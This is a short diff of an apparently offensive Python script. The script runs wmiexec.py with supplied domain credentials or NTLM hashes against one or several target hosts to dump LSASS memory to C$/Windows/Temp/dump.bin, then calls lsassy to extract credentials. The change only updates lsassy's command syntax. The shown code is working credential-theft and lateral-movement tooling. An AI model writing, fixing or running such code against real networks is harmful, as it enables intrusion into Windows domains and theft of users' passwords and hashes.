@@ -164,9 +164,9 @@ if __name__ == "__main__":
                 wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, args.targ)
             command1 = wmi_command + ps_command_dump
             if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
-                command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, args.targ)
+                command2 = 'lsassy --hashes {} --dumppath C$/Windows/Temp/dump.bin {}/{}@{}'.format(args.pasw, args.domn, args.user, args.targ)
             else:
-                command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, args.targ)
+                command2 = 'lsassy --dumppath C$/Windows/Temp/dump.bin {}/{}:{}@{}'.format(args.domn, args.user, args.pasw, args.targ)
             try:
                 command_output = subprocess.check_output(command1, shell=True)
                 command_output = command_output.decode("utf-8")
@@ -197,9 +197,9 @@ if __name__ == "__main__":
                         wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, ip)
                     command1 = wmi_command + ps_command_dump
                     if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
-                        command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, ip)
+                        command2 = 'lsassy --hashes {} --dumppath C$/Windows/Temp/dump.bin {}/{}@{}'.format(args.pasw, args.domn, args.user, ip)
                     else:
-                        command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, ip)
+                        command2 = 'lsassy --dumppath C$/Windows/Temp/dump.bin {}/{}:{}@{}'.format(args.domn, args.user, args.pasw, ip)
                     try:    
                         command_output = subprocess.check_output(command1, shell=True)
                         command_output = command_output.decode("utf-8")
